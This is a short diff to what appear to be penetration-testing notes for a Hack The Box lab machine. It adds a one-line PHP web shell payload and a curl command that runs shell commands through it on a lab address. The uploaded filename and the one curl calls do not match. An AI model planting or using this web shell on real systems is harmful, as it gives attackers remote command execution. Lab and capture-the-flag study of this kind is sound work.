@@ -584,3 +584,13 @@ Open MSFConsole / Netcat to get the shell access.
 c.) MSFConsole
 use local_exploit suggester after you get a shell access to find what other exploits can you do to get root access.
 
+d.) PHP upload
+Make sure you install the following in kali: apt install php-curl
+Add this below to any PHP exploit assuming to get a shell
+$file = [
+    'filename' => 'ippsec.php',
+    'data' => '<?php system($_REQUEST["cmd"]); ?>'
+];
+Run the php using curl: curl http://10.10.10.9/0xdf.php?cmd=whoami
+#BASTARD HTB
+
